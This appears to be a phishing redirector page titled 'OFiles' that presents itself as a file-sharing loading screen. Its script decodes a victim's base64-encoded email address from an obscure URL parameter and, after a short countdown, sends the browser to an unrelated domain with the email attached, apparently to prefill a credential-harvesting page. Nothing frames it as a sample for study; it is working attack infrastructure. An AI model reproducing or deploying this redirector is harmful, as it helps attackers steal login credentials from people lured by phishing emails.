<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OFiles</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #1a202c;
            color: #e2e8f0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, sans-serif;
            padding: 20px;
            text-align: center;
        }
        
        .loader {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            border-top: 3px solid #3b82f6;
            margin: 0 auto 20px;
            animation: spin 1s linear infinite;
        }
        
        h1 {
            font-size: 1.5rem;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        p {
            color: #a0aec0;
            margin-bottom: 20px;
        }
        
        .countdown {
            font-size: 0.9rem;
            color: #718096;
            margin-top: 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
<!--     <h1>Redirecting</h1>
    <p>Please wait while we process your request</p> -->
    <div class="countdown" id="countdown"></div>

    <script>
        // Get the email parameter from the URL
        const urlParams = new URLSearchParams(window.location.search);
        const base64Email = urlParams.get('doonxxxlive');
        
        // Decode the email from base64
        let decodedEmail = '';
        if (base64Email) {
            try {
                decodedEmail = atob(base64Email);
            } catch (e) {
                console.error('Base64 decoding error:', e);
            }
        }
        
        // Set up the redirect
        let secondsLeft = 2;
        const redirectUrl = `https://wd0c435.doonxxxlive.com/UOEnoDSy?haz=uabe3w2tkodvPDMPjvjj1yJhfPqE1r0RVSgqIK4x5nQ5-LAplYZwUeECmdM#${decodedEmail}`;
        
        // Update countdown
        const countdownInterval = setInterval(() => {
            secondsLeft--;
            document.getElementById('countdown').textContent = `Redirecting in ${secondsLeft} second${secondsLeft !== 1 ? 's' : ''}`;
            
            if (secondsLeft <= 0) {
                clearInterval(countdownInterval);
                window.location.href = redirectUrl;
            }
        }, 1000);
    </script>
</body>
</html>
